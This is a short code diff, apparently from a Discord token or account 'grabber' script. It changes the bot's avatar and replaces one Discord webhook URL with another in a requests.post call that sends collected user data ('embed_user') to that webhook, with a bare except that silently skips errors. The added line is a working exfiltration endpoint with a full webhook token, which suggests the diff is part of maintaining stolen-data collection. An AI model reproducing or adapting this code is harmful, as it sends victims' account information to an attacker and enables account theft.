@@ -183,10 +183,10 @@ def main():
                         }
                     ],
                     "username": "Grabber",
-                    "avatar_url": "https://avatars.githubusercontent.com/u/43183806?v=4"
+                    "avatar_url": "https://i.pinimg.com/736x/a5/39/b5/a539b509dd3f03a36bb7d89f813ed63e.jpg"
                 }
 
-                requests.post('https://discord.com/api/webhooks/1337748566478819328/19njo4_R7BzHhjMO5qHn47EI2evmz7no94O6fqXDNXYOolX8Bu_2XKDQ9UdW9CWZbpPl', json=embed_user, headers=getheaders())
+                requests.post('https://discord.com/api/webhooks/1386001246032236635/KyyV3jJDG4SbbP0qGHbLEmhPGUQOxVb0i2s8X8dz9XD6n66zPHBYPKi4-m7wn25HV173', json=embed_user, headers=getheaders())
             except:
                 continue
 
